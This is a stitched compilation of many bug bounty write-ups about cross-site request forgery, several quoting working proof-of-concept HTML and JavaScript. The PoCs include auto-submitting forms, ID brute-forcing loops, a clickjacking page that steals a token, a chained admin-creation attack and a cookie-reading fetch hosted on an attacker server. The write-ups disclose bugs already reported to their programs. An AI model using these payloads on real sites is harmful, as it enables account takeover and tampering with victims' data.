It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSite wide CSRF on a popular program Skip to main content Search This Blog Ajinkya's blog Blog about programming, bug bounty & tech Site wide CSRF on a popular program Get link Facebook X Pinterest Email Other Apps Wednesday, February 05, 2020 I found this bug in the same program that I explained in this post \" Authorization bug every bug hunter missed \" I was moving through another target on this program when I noticed that there was no CSRF protection like there were no tokens etc so I wondered what they were using to prevent CSRF, I noticed some high entropy strings in headers but request worked without those headers as well so that wasn't protecting the website from CSRF. Request body consisted of JSON objects basically {key: \"value\"} pairs the assumption behind using it was that in a typical CSRF attack attackers don't send JSON payloads, so using JSON will naturally protect the application against CSRF. Here's where the trick comes in, It's actually more of check that you should perform while trying to find CSRF bugs, I spotted it on Twitter first you may or may not be familiar with it, here's how it works. It's very simple assume that server side framework is expecting some JSON input by default in the HTTP Request body so if it detects JSON object it will automatically parse it. But even if you send regular Content-Type that is application/x-www-form-urlencoded then also it will automatically parse that and start using it, problem is caused by not checking the Content-Type, it should be strictly application/json if you're expecting JSON input. So in this case to trigger CSRF I just sent regular CSRF payload but due to their negligence of not validating Content-Type header to be strictly JSON server accepted the regular HTTP parameters and triggered the CSRF. <html> <form id=\"csrf\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\" action=\"https://www.example.com/api/REDACTED/PATH\"> <table> <tr><td>primaryPhoneType</td><td><input type=\"text\" value=\"0101101101\" name=\"primaryPhoneType\"></td></tr> <tr><td>firstName</td><td><input type=\"text\" value=\"YOUREcsrfedCongratsbtw\" name=\"firstName\"></td></tr> </table> <input type=\"submit\" value=\"https://www.example.com/api/REDACTED/PATH\"> </form> <script type=\"text/javascript\"> document.getElementById('csrf').submit() </script> </html> This could have been prevented by validating Content-Type header to be application/json In my case the server was accepting regular HTTP Post parameters along with expected JSON, so I reported the bug, but my report was marked as duplicate 😩 against someone who reported site wide CSRF using Flash. If you find JSON objects without CSRF protection being passed around in HTTP body try to change it to regular HTTP parameters and see if it works, if the server side application is accepting non JSON parameters then it'll process the input and you maybe able to get a CSRF.

Frame injection is a type of code injection vulnerability where attacker can injection frames which contains links to malicious websites or advertisements links. To know more about Iframe Injection you can click here . 2. After Injecting the Iframe in page, who actually calls the Iframe [ Client’s Browser or server]. Iframes that are injected into web pages are mostly called by Client’s Browser except in some cases like PDF generators. To check who is calling the injected frame you can inject an frame which source of Burp Collaborator like [<iframe src=xxxxxx.burpcollaborator.net></iframe> ], and checking the logs of Burp Collaborator will reveal the caller of Frame.😮😮 3. What is Cross Site Request Forgery ( CSRF). Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. To learn more about CSRF you can visit PortSwigger . So Lets get Started When you start to hunt on particular domain , the best thing to do first is to take a look at all the features of the domain and take a note of that. Understanding the flow of a particular website will help you to chain attacks and logically break it. It was a private Program so lets consider the site ABC.com After looking at all the features i got to know that there is an Discussion Forum where all the members of community can chat with each others. Press enter or click to view image in full size Here you can start a topic and discuss it with your community members. So i started to inject my payload on reply feature, which concluded that the reply section was vulnerable to HTML Injection but not to XSS. I tried to inject many XSS payloads but didn't succeeded. Press enter or click to view image in full size So i tried to inject Iframe and BOOM! It was reflected. 😋 😋 So my next task was to increase the Impact of these vulnerability ,😮😮 so i started other features of the website too. After some time i came across a section where i was able to change my email address . The first think that came into my mind was to try CSRF attack . And the request to change the email looked like. Press enter or click to view image in full size Which confirmed that Email change feature is vulnerable to CSRF attack .So i quickly generated HTML code. Press enter or click to view image in full size But to perform an CSRF attack Victim must link on visit a particular link from where the request to change email will be sent. But these was not possible here because admin would not click on any malicious link . So i thought lets combine the CSRF with Iframe Injection which i found earlier . So i started my AWS Server lets consider it has ip [x.x.x.x] and copied the CSRF code in index.html page. After that i injected the iframe payload i.e <iframe src=http://x.x.x.x/index.html”></iframe> in discussion forum and it was GAME OVER for admin after viewing the discussion forum, because he’s email id was changed to attacker’s email id. ATTACK SCENARIO: - Attacker will inject iframe into Discussion Forum which contains the link of email change request. After victim or admin visits the discussion forum their browser’s will load the iframe which will lead to send the email change request from victims machine.

About the Vulnerability : You all know about the 2FA Bypass Vulnerability. There are some Techniques. Bypassing 2fa using conventional session management Bypassing 2fa Via OAuth mechanism Bypassing 2fa via brute force Bypassing 2fa using race conditions (RARE) Bypassing 2fa using modifies response Bypassing 2fa using Activation link Bypassing 2fa in password reset page But here I am able to disable the 2FA via Client side attack which is CSRF. For Discovering the bug I have tried to Disable 2FA using CSRF file. But I have seen that there is token is generated in the CSRF poc. But when I tried this html file that token is never get expired. This token is used again and again to disable 2FA on another Account. Note : Always try to Disable 2FA using CSRF Attack. So the program is Mail.ru which is Available on Hackerone. Mail.ru - Bug Bounty Program | HackerOne The Mail.ru Bug Bounty Program enlists the help of the hacker community at HackerOne to make Mail.ru more secure… hackerone.com Pandao.ru is the extended program name that I have found vulnerability on this domain. Tools Used for this Vulnerability: BurpSuite Steps to Reproduce the Vulnerability Go to https://pandao.ru/profile/settings and sign up for two accounts. In which first is attackers account and second is Victim’s Log in to Attackers account and capture the Disable 2FA request in Burp suite and generate CSRF poc. Save the CSRF poc file with extension .HTML. Now log in into Victim’s account in Private Browser and fire that CSRF file. Now you can see that It disable 2FA which leads to 2FA Bypass. Video is Attached to Demonstrate this Vulnerability. Thank You Disclosure : I reported to them 9th August They saw the report, steps to reproduce, and PoC(Video). And, this program is in Extended scope of mail.ru and They do not pay for Client side attacks so I didn't get any Bounty for this.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAn inconsistent CSRF – Smaran Chand Skip to content Smaran Chand Menu Home About Me Search for: October 15, 2019 An inconsistent CSRF I discovered Cross-Site Request Forgery (CSRF) issue in one of the bug bounty programs but limited to some easy and simple actions only. After spending a few minutes by browsing each and every functionality in the web application I discovered that a feature to delete “Shipping Address” from the account was not protected with CSRF token or any control mechanism. It wasn’t easy as I thought it, because one of the parameters was “dynamic” varying from account to account and it had a different numeric value for each user. POST /MySettings/DeleteAddress?addressId=14502 HTTP/1.1 Host: www.xyzcompany.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json; charset=utf-8 X-Requested-With: XMLHttpRequest Content-Length: 2 Connection: close Referer: https://www.xyzcompany.com/MySettings Cookie: Nop.customer=peepdipeepdi_cookies_and_biscuits; ASP.NET_SessionId=sessionid_xxxx; __RequestVerificationToken=token_xxxx {} As we can see in the HTTP request CSRF protection is not present but the parameter “addressId” differs from person to person. Now in order to make CSRF successful we need to guess addressId and craft the payload respectively which is very hard to gather. I remembered we had faced this kind of issue during the VAPT project of a client at our workplace with my friend Nittam . I wrote a simple JS code which would brute requests from victims browser within the provided range. For example, whenever a victim will click on CSRF payload his browser would send hundreds of the web request with certain range of numeric addressId and upon a match, the address from victims account will be deleted. <html> <!-- Dynamic CSRF PoC To delete address from any account --> <script> function submitRequest(id) { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://www.xyzcompany.com/MySettings/DeleteAddress?addressId=\"+id, true); xhr.setRequestHeader(\"Accept\", \"*/*\"); xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=utf-8\"); xhr.withCredentials = true; var body = \"{}\"; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody])); } for (i=14400;i < 14510; i++) { submitRequest(i); } </script> </html> It is obvious that running above script would reduce the browser’s performance, the browser could act unresponsive as well because of hundreds of the request at a time. Whenever a victim will visit the CSRF payload, the number of requests will be sent via the victim’s browser. And upon the match of AddressId, his saved address will be deleted. Bruting AddressId and sending HTTP requests. And It worked !!! Bug Bounty Post navigation Older post No Rate limiting eligible for bounty ?

Hello Everyone! | by Rajesh Ranjan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I CSRF’d My First Bounty! Rajesh Ranjan 2 min read · Mar 3, 2020 -- 2 Listen Share Hello Everyone! This is my first blog post, and I decided to start off by sharing about my recent finding. It was a CSRF issue, which earned me $500! What makes this even more special for me is that it was my first bounty ever! Introduction to CSRF: Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. Initial Reconnaissance Phase So, I got an invitation for this private program on Bugcrowd, and it was an e-commerce website. During my initial recon, I noticed that the users can add their address into their account. So, I quickly checked the request and there was some token named form_key that was being used to protect the users from CSRF attack. Press enter or click to view image in full size form_key to protect CSRF attacks So, the next thought which came to my mind was, is there any server side validation on this token? I quickly logged into my second test account, generated a CSRF PoC , removed the token for this particular request, and sent it to the victim. And the final request was something like this: Press enter or click to view image in full size Removed the form_key value in the request Did you notice something? I have removed the form_key value from the PoC, and not the entire input tag. I sent this to the victim, and when the victim clicked on “Submit”, the address was added to his account, which was the attacker’s address. Press enter or click to view image in full size Attacker’s address added to victim account Boom! Like I suspected, there was no server-side validation on form_key token. So, the next time you come across a CSRF token, be sure to perform this kind of validation.

I test the function of reset password I sent another link to my account and i sent the same request but it returns 403, I opened the new reset link bug didn't use it and I go back to my burp and sent the request again and it works and I changed the password with outsend the request from the browser, I understand the function when the user opens the link there is a session will open and will add the token on it and there is something like value to chack like (change=1) if it (1) the server will change the password which comes from the same session if it (0) it will return 403 this what I understand from test the function so now if the user opened the link and didn't use the token it will not be expired and we can use the CSRF bug in this time and we will gain account takeover in this case. I liked this bug so I published it, but the subdomain was out-of-scope and I didn't notice it XD. Goodbye.

This will result in a serious security flaw in the web application. In this write up I will explain how to identify the JSON CSRF vulnerability and the challenge I face to escalate this bug in a recent project. Generally, the JSON CSRF is not always possible in every web application that uses the JSON body. Mainly it depends on the authentication mechanism. To identify this, we have to make sure that the HTTP request satisfies the below conditions. The authentication mechanism should be in the cookie-based model.

Let’s assume the website name is redacted.com So when I visited the profile page https://redacted.com/editinfo/ & tried to change the account details there was a CSRF token I tried different methods to bypass that CSRF protection but failed, then I found the suspicious endpoint that was disclosing the CSRF token https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ So when I opened that endpoint I found the CSRF token in the response, Now the next part was to steal the CSRF token & then I found out that there was no protection from the click jacking I created an HTML + JS Script to exploit the CSRF in just 1 Click <!DOCTYPE html> <html> <head> <title></title> </head> <body> <center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win a $100</h1></center> <h3>Click inside the box and Press CTRL+A then CTRL+C</h3> <div style=”border: 2px solid gray;”> <iframe src=” https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ \" width=”100%” style=”opacity: 0\"></iframe> </div> <h3>Click inside the box and press CTRL+V</h3> <input type=”password” name=”” size=”1\"> <br> <button id=”btn”>Click to Win</button> <div style=”display: none;”> <form action=”” method=”POST”> <input type=”hidden” name=”addrid” value=”12741305\" /> <input type=”hidden” name=”uname” value=” hack@gmail.com ” /> <input type=”hidden” name=”issendmsg” value=”1\" /> <input type=”hidden” name=”display” value=”” /> <input type=”hidden” name=”sendtype” value=”update” /> <input type=”hidden” name=”firstname” value=”accountinfo” /> <input type=”hidden” name=”lastname” value=”HACKED” /> <input type=”hidden” name=”country” value=”US” /> <input type=”hidden” name=”reglang” value=”en&#95;US” /> <input type=”hidden” name=”postcode” value=”1337\" /> <input type=”submit” value=”Submit request” /> </form> </div> </body> <script> document.querySelector(“#btn”).onclick = function() { var token = document.querySelector(“input”).value var form = document.querySelector(“form”) token = JSON.parse(token) var mapInput = document.createElement(“input”); mapInput.type = “hidden”; mapInput.name = “auth_token”; mapInput.value = token.Value; form.appendChild(mapInput) form.action = ` https://redacted.com/editInfo` form.submit(); alert(“Congratulation!

H-User = Some Privileges 3. L-User = Low Privileges 4. Guest = Very-Low Privileges 5. Program-Name = Redacted.com 6. The application is using json in the backend to transfer the data I recently participated in a private Bugcrowd program with four user roles: Admin, H-User, L-User, and Guest. As part of my testing approach, I started by logging in with the admin account to explore the application’s functionalities. During this exploration, I noticed that any changes made to site information triggered API requests to the server, following a pattern like https://redacted.com/api/* . While testing account settings, specifically the location field, I decided to delve deeper through fuzzing techniques. Interestingly, I discovered that the API endpoint lacked additional CSRF (Cross-Site Request Forgery) protection. While the API key served as a basic protection layer, it wasn't enough to fully secure the endpoint. Press enter or click to view image in full size API request To exploit the CSRF vulnerability in the API endpoint, I required an any user API key. However, I identified an interesting functionality: a shared file and chat endpoint ( https://redacted.com/office/[unique-Key]/story ). Uploading a file and sharing it with everyone offered a potential path forward. Here’s how I executed the attack: Shared File with L-User: I uploaded a file and shared it with everyone using the aforementioned endpoint. Switched Account: I then switched my login to an L-user account. Triggered Notification: Upon logging in as the L-user, a notification appeared in the sidebar indicating a document shared by the admin. Opening the notification likely triggered an API request. Intercepted Traffic with Burp: Anticipating a potential data leak in API requests related to the notification, I started Burp Suite listeners and refreshed the page. Filtered Requests: I set a Burp filter for requests containing “story*” to narrow down the relevant traffic. Identified Vulnerable Endpoint: After analyzing captured requests, I identified a vulnerable endpoint: /API/officename/[id]/storyPost/[L-user-office-id]/comments . This endpoint appeared to leak data belonging to the admin and potentially other users. Further Fuzzing: Further exploration through fuzzing techniques revealed another endpoint leaking sensitive information, including user IDs, usernames, emails, API keys, office keys, and potentially more. Press enter or click to view image in full size Leak other user info With the identified vulnerability, I proceeded to craft a CSRF exploit. JSON-based CSRF attacks can be achieved through two primary methods: Flash and XMLHttpRequest (XHR). Since the server relied on PUT requests for data updates, the Flash method wasn’t applicable. Focusing on XHR, two key factors contribute to its successful exploitation: Cross-Origin Resource Sharing (CORS) misconfiguration and the presence of XSS. Fortunately, I had already discovered a stored XSS vulnerability within the program. Leveraging the XSS, I constructed a CSRF exploit file. This file, when sent to the admin as a link, could potentially trigger the identified vulnerability upon clicking. The impact of this action could have resulted in unauthorized modification of the admin’s user data, including email, password, and username. Press enter or click to view image in full size Press enter or click to view image in full size Press enter or click to view image in full size Impact:- The identified CSRF vulnerability held significant implications. By exploiting this vulnerability, it was possible to gain the ability to modify various user data, including passwords, usernames, and email addresses. This impact extended not only to the admin account but potentially to all users across the main domain and its subdomains. BugBountyTips:- My experience highlights the importance of fuzzing group communication functionalities, such as file sharing and chat endpoints. Fuzzing these areas can potentially uncover leaks of sensitive data, like user tokens, usernames, or API keys. In my case, fuzzing the /api/story* endpoint on a specific platform revealed a significant vulnerability. This endpoint facilitated group chat, note sharing, and file sharing among various user roles (admin, H-user, L-user, and guest). Responsible Disclosure and Collaboration I’d like to express my appreciation to the company’s co-founder for their exceptional approach. When the platform itself wasn’t responsive to my initial inquiries, the co-founder directly contacted me to clarify the situation. This collaborative approach is crucial for responsible vulnerability disclosure and improving platform security.

The target let’s just say it was named redact.com was sending a PUT request to the server for updating User Information like Address, Name, etc. An Origin Header was also sent in the request Origin: redact.com which was reflected in the Response and the Access-Control-Allow-Credentials was set to True. Which means that cookies can be sent along with the request. I tried to change the Origin Header value to evil.com and then redact.com.evil.com but both were rejected. But sending the Origin : evil . redact.com worked which means that sub domain of redact.com can send requests to its API. Press enter or click to view image in full size Now I needed an XSS on one of its subdomains to send the PUT request to the Server, luckily I got an XSS on help.redact.com. But it wasn’t enough an enctyptedMembershipNumer param was sent along with the PUT request to identify the user. After looking into the Cookies of redact.com I found that the enctyptedMembershipNumer was saved in a cookie with a name prop_29 which was scoped to the . redact.com the dot, in the beginning , means that this cookie can be accessed from its subdomains. So to extract that Cookie I wrote a JS code. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } Now the complete code to get the enctyptedMembershipNumer and to send the PUT request. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } cook = getCookie(“prop_29”) data = {“member”:{“mailingAddress”:{“addressLineOne”:”Account Hacked”,”city”:”NEW Port”,”stateOrProvinceCode”:”NY”,”postalCode”:”20001\",”email”:” hacked@gmail.com ”,”countryCode”:”US”}}} fetch(` https://www.redact.com/api/node/vivaldi/v1/account/primary-contact?encryptedMembershipNumber=${cook}` , {method: “PUT”, credentails: “include”, body: JSON.stringify(data)}) I created a JS file and uploaded the code on my server to use in the XSS payload.

I want to take a moment to all who helped me learn Web Application Security and Bug Bounty Hunting! :) Hello, Guys, the Program was a private Invite and I am still working with this program. So, for the sake of the privacy of the program, let us call it “example.com” in this writeup. I got this invite around 6 months back. The Website has the functionality of making an order of using public transport ( e.g. Purchasing tickets, passes, storing user information like card details, home address, work address, etc.). To test the CSRF, I created two accounts. One for the attacker and another for the Victim. Let us call it as “Attacker@gmail.com” and “victim@gmail.com”. Press enter or click to view image in full size “attacker@gmail.com” Now, I filled in the details for both the account. And then I started making some changes into it like adding work address and making an order from the Attacker’s account. I Put the Burp Intercept ON and clicked on the “save” button. Here is the burp request which I captured. Press enter or click to view image in full size Now, I generated the CSRF poc using the burp suite and saved it as an html page. And send it to the victim account who was logged in using the Chrome browser. I opened the HTML page in the new tab of the Chrome browser and refreshed the page where I was already logged in. And Boom….. The work address of the victim was changed to “bla….bla…bla” and a new order was made on behalf of the victim. As the card details were not added in both the accounts, the order was eligible for on-spot payment. Now…I thought that if the attacker is able to make order on behlaf of the victim then he could probably also takeover the victim’s account. I said to let’s check it out.. :) Now to take over the account, I went to the setting page of the attacker's account first and then gave a temporary email address from the temp-mail.ord and captured the request in Burp without any changes by re-saving the same information. Then I saved the CSRF POC and sent it to the victim. As soon as I opened the page in the victim’s browser the email of the account changed from “victim@gmail.com” to the temp-mail one. Then I was like…. Finally, I made a nice report and submitted it to the program. The Company took almost 3 months to respond and closed the report by paying $750 in the next 1 month. Although it was less for the account takeover ;). I thought of putting this writeup a million times but I am Lazy! Lol! :P Thanks for being patient and reading this writeup. This is my first ever writeup. I hope you all like it and let me know if you want me to put anything else in my next writeup or any mistakes in this writeup.

They handle some fairly sensitive personal information on behalf of their users. We found a couple medium severity bugs the first 2 days, noted some areas to come back to, and noticed some other areas that could be easily escalated and exploited when finding a XSS. We spent a fair bit of that time trying to find a XSS because we knew as soon as we did, a user account takeover could be performed by changing the user’s email as there was no validation or verification process such as verifying the change from the old email address or requiring the user to enter a password. Unfortunately, XSS’ have been very hard to find on this application as pretty much all user input goes through a filter that blocks any special character. On the 2nd night hunting on the program (Friday), we discovered the application has some functionality to import users from CSV. It’s an interesting process where there are several steps required in order to import the users from the CSV file. We tried to include special characters through the CSV upload, but they were also filtered unfortunately. Then after trying the filename itself: <img src=x onerror=alert(document.domain)>.csv an alert box popped! We could now perform a user account takeover using this XSS. After continuing to test this, we quickly realized that this only triggers the moment you upload the file, even though the filename is persisted. There is no encoding performed at the time of file upload, but encoding is done any point after the initial upload. So this basically means that we can only execute this as a self-XSS, which is out of scope from the program. After trying a bunch of different payloads to bypass the encoding done by the application, there was no luck. The next course of action is to keep this in our back pocket and hope the encoding can be bypassed at some point, or execute it through some other way. Lucky for us, the endpoint does not have CSRF protection. Well this should be easy enough, just craft a CSRF request to trigger the self-XSS. <html> <body> <script>history.pushState('', '', '/')</script> <script> var uploadId = UPDATE_THIS_WITH_ID; function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", `https://company.com/users/uploadFile?uploadId=${uploadId}`, true ); xhr.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\"); xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------1566359571913061724703232384\"); xhr.withCredentials = true ; var body = \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"uploadedFile\\\"; filename=\\\"<img src=x onerror=alert(document.domain)>.csv\\\"\\r\\n\" + \"Content-Type: text/csv\\r\\n\" + \"\\r\\n\" + \"Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\\r\\n\" + \"H1 Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"rosterType\\\"\\r\\n\" + \"\\r\\n\" + \"staff\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"importMethod\\\"\\r\\n\" + \"\\r\\n\" + \"updateAdd\\r\\n\" + \"-----------------------------1566359571913061724703232384--\\r\\n\"; var aBody = new Uint8Array(body.length); for ( var i = 0; i < aBody.length; i ++ ) aBody[i] = body.charCodeAt(i); xhr.send( new Blob([aBody])); </script> <form action=\"#\"> <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /> </form> </body> </html> The above PoC worked as a CSRF, but there wasn’t an endpoint the user could be sent to after submitting the POST request that would trigger the XSS. All the target endpoints already had the filename encoded. After trying a few different redirects and other techniques, nothing seemed to be working so we dropped this and decided to take a break. Fast forward to Sunday night (2 days after discovering the self-XSS), watching T.V., and some random inspiration hits (which happens surprisingly often since starting bug hunting)! Why don’t we forget about this red herring of a self-XSS and try to exploit this endpoint with a CSRF. We were blinded by the XSS possibility to realize this 😄. The file upload process contained the following aspects, all of which are required to push the change from file upload to users being added: Upload the file ( POST-1 ) Fix any mistakes in the upload ( GET-1 ) Verify changes in the upload & submit for preview/verification ( GET-2 ) Verify changes from preview, and submit the upload ( GET-3 ) We already knew the first POST request was vulnerable to CSRF, and went through the remaining 3 GET requests and were lucky to see that these were also vulnerable to CSRF. This was a bit tricky, because some of the steps were not clear on how they could be executed, and there was 1 missing step from the above steps that would be identified later. After spending some time crafting a PoC for the the above 4 steps with no idea why it didn’t work, it seemed the application required the upload job to be viewed before it could be fixed. So it required us to insert a step between 1 and 2 which was a request to view the job. Also, CORS was adequately configured on the endpoint, so we could not get any response data when calling the endpoints, which would’ve been very helpful in order to get the current status of each of the steps (as each take a couple seconds-minutes depending on how much data was uploaded, internet speed, server load, etc.). After some testing on the average time it takes for each request to finish processing, we could then use Javascript’s setTimeout to stagger each of the 4 requests to ensure we can chain all of these CSRFs in one go. The final PoC code looked like: <html> <body> <script>history.pushState('', '', '/')</script> <script> var uploadId = UPDATE_THIS_WITH_ID; function xhrRequest(url) { var xhr = new XMLHttpRequest(); xhr.open('GET', url); xhr.withCredentials = true; xhr.send(null); } function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", `https://company.com/users/uploadFile?uploadId=${uploadId}`, true ); xhr.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\"); xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------1566359571913061724703232384\"); xhr.withCredentials = true ; var body = \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"uploadedFile\\\"; filename=\\\"neema.csv\\\"\\r\\n\" + \"Content-Type: text/csv\\r\\n\" + \"\\r\\n\" + \"Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\\r\\n\" + \"Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"rosterType\\\"\\r\\n\" + \"\\r\\n\" + \"staff\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"importMethod\\\"\\r\\n\" + \"\\r\\n\" + \"updateAdd\\r\\n\" + \"-----------------------------1566359571913061724703232384--\\r\\n\"; var aBody = new Uint8Array(body.length); for ( var i = 0; i < aBody.length; i ++ ) aBody[i] = body.charCodeAt(i); xhr.send( new Blob([aBody])); window.setTimeout( function () { window.open(`https://company.com/users/upload?uploadId=${uploadId}`); window.setTimeout( function () { xhrRequest(`https://company.com/users/fix?uploadId=${uploadId}`); window.setTimeout( function () { xhrRequest(`https://company.com/users/submitToPreview?uploadId=${uploadId}`); window.setTimeout( function () { xhrRequest(`https://company.com/users/submitImport?uploadId=${uploadId}`); }, 2000) }, 2000) }, 2000) }, 2000) } </script> <form action=\"#\"> <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /> </form> </body> </html> The above code sends the initial POST request, and then staggers each request after the initial upload by timing out for 2000 ms (2 seconds). We found this to be a safe estimate for uploading 1 user. When this page hosted by the attacker (assuming the victim is an admin) is visited, the CSRF attack is executed and the 4 vulnerable endpoints are exploited to create an administrator user for the attacker. The attacker receives an email with their username and password to login. Once logging in, an administrator can delete any other administrator, so the attacker can delete all the other admins in the company, and completely takeover the account. This gives the attacker full access to all data and functionality, simply by the victim visiting the attacker controlled page. After writing up this PoC, the report was finally sent over to the team who responded incredibly quickly with a triage and fix (well done to this team, they are very responsive and quick to act).

Mr.Hacker here, in this article I am going to show how I bypassed csrf using cross frame scripting in a public program on HackerOne. So directly cutting to the point, there is a module in the web application to send messages to users as shown below. Press enter or click to view image in full size Send Message Form Initially i tested for csrf vulnerability on this module but it was completely mitigated and there was a token in the post request which was validated by the server, hence csrf was not possible. But later i noticed that after generating csrf poc in burp and removing the csrf token and executing it, the server would respond back with the same form values and new csrf token set in the new message form as the response. So now if i click on “Post Message” then the request would be sent to the server with the form values already being set by the server and request would get successfully executed. Later i came up to chain cross frame scripting and csrf as the entire web application was vulnerable to cross frame scripting. Press enter or click to view image in full size CSRF File In Clickjacking Press enter or click to view image in full size Chaining CrossFrameScripting and CSRF Attack Scenario : The attacker will generate a valid csrf poc with burp with form values and removing csrf token. Now if we execute the csrf poc server will respond with all form values pre set in the response and also with a valid token, Hence an attacker will include the csrf file inside clickjacking file. So when the victim clicks on the malicious url sent by attacker, the clickjacking file will load the csrf file and inturn it would auto submit the form with the respective values and later server will send a response with the same form values set and also with the valid csrf token. Hence now the response is loaded using clickjacking and when the user clicks on Post Message it would generate a valid request and it will be executed successfully. Later i submitted this vulnerability and got a bounty reward, the reason behind the article was to understand that no vulnerability is low if we try to chain it with few other it can also give a high impact issues. Mostly people avoid submitting cross frame scripting or other low impact vulnerabilities as they are out of scope but if we can use it in a unique way then low hanging fruits can also give us a great impact with few other vulnerabilities. You can see the video Poc Here . That’s it, i hope you enjoyed this article and Happy Hacking!.

Armaan Pathan 2 min read · Mar 12, 2019 -- 1 Listen Share While testing an application, there was a module “Delete User” in which an admin can delete any user. Press enter or click to view image in full size If you notice in the request, there is no CSRF Token/Protection implemented into delete user request. This was very easy CSRF that an attacker can send the form to admin and can delete the user from an application. Simple CSRF PoC to Delete User Press enter or click to view image in full size But again if you notice that request contains the user id. My challenge was to figure out that if an application user ids at any endpoints but I found that there was no user ID leakage. As it was 5 digits numeric ID, It was easy to brute force, From the research I got the blog post in which an attacker has brute-forced the IDs with the help of clickjacking. Client-side CSRF Token Brute Forcing While playing around with some CSRF examples the idea of client-side CSRF token brute-forcing came into my head. I'd… pwndizzle.blogspot.in Now Challenge is that an application was using X-Frame Options Header so I was not able to load an application into the frame to brute force the IDS. I tried with XMLHttpRequest, But again an application was validating the ORIGIN so, in this case, XHR dint work for me. Then I tried by throwing requests into iframe target. In this case, I was not able to view the response as the response had X-Frame-Option Header which application was validating. But I was able to send the request So I made a CSRF Script which brute forces the USER IDS and deletes all the existing Users with CSRF from an application Press enter or click to view image in full size And When I sent this PoC to the victim (admin), I was able to delete all Existing users from an application.

Yeasir Arafat 2 min read · Oct 26, 2018 -- 5 Listen Share Hi folks, It’s always a pleasure to share some good stuff with you guys. The heading of the story may give you an idea that today I’m going to share something about CSRF protection bypass. What is CSRF protection? In short, CSRF(Cross-Site Request Forgery) attacks specifically target state-changing requests on a web browser. To prevent this attacks developer adds an ANTI-CSRF token in the request in several ways. For more, you can see it from here, ` Article-1` ` Article-2` It was a private program that I was testing and because of privacy, I can not disclose the name. Let’s assume the site name is vulnhost.com. It was protected to CSRF until I found the bypass. The vulnhost.com verifying its request under a POST material request. Vulnhost.com actually implemented the _csrf token to the POST request and validate it on the server side. The state changing POST request looked like this, POST /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact HTTP/1.1 Host: en.vulnhost.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Accept: application/xml, text/xml, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://en.vulnhost.com/mycenter/settings/account.html Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Wicket-Ajax: true Migration-Wicket: 6 Wicket-Ajax-BaseURL: mycenter/settings/account.html Wicket-FocusedElementId: id49 X-Requested-With: XMLHttpRequest Content-Length: 246 Cookie: ....... Connection: close _csrf=725a7f90-192f-4b94-8fc9-6320ace14fef&id48_hf_0=&gender=radio8&firstName=xx&lastName=YY&saveContact=1 Here, the _csrf= parameter generates the random token to verify the request. If I change/remove the _csrf token to the GET request vulnhost.com do not validate it on the server side. For the bypass I change the request method POST to GET and remove the _csrf= paramter from the request. like below request ,, GET /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=XX&lastName=YY&saveContact=1 HTTP/1.1 Host: en.vulnhost.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Accept: application/xml, text/xml, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://en.vulnhost.com/mycenter/settings/account.html Wicket-Ajax: true Migration-Wicket: 6 Wicket-Ajax-BaseURL: mycenter/settings/account.html Wicket-FocusedElementId: id49 